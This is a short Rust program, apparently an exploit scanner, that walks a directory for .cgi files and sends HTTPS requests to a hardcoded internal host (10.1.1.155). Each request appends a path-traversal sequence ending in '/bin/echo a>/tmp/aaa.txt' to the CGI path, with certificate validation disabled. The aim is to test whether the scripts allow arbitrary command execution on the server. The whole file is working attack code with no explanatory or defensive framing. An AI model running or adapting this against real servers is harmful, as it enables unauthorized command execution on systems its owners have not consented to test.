use reqwest::Client;
use std::env;
use walkdir::WalkDir;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env::set_var("RUSTC_NO_SRC_PATH", "1");

    let path = env::args().nth(1).unwrap();
    println!("directory:{}", &path);

    for entry in WalkDir::new(&path).into_iter().filter_map(|e| e.ok()) {
        if entry.file_type().is_file() && entry.path().to_string_lossy().contains(".cgi") {
            let cgi = entry.path().to_string_lossy();
            let uri: Vec<&str> = cgi.split("cgi-bin").collect();
            let uri = uri.get(1).unwrap();

            let cli = Client::builder()
                .danger_accept_invalid_certs(true)
                .build()?;
            let uri = format!(
                "https://10.1.1.155/cgi-bin{}/../../../../bin/echo a>/tmp/aaa.txt",
                uri
            );
            let resp = cli.get(&uri).send().await?;
            let status_code = resp.status();
            let text = format!("{}:{}:{}", status_code, &uri, resp.text().await?);
            println!("{}", text);
        }
    }
    Ok(())
}
